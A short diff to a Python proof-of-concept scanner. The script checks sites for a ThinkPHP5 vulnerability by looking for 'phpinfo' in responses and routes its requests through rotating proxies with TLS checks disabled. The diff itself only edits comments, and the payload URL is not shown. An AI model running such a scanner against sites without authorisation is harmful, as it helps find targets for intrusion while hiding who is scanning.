@@ -25,7 +25,6 @@ def fetch_proxies(count=PROXY_COUNT, protocol="http"):
                 proxies = data["data"].get("proxies", [])
                 print(f"[*] 获取到 {len(proxies)} 个代理")
                 return proxies
-    # 修复：缩进错误 + 规范异常捕获
     except requests.exceptions.RequestException:
         return []
 
@@ -49,12 +48,11 @@ def poc(url):
         try:
             proxy = get_proxy()
             proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
-            # 修复：增加请求头
+            # 增加请求头
             resp = requests.get(pocurl, headers=headers, proxies=proxies, verify=False, timeout=5)
             if  resp.status_code == 200 and "phpinfo" in resp.text:
                 print("thinkphp5漏洞存在----------",url)
                 return 
-        # 修复：规范异常捕获
         except Exception:
             pass
                     
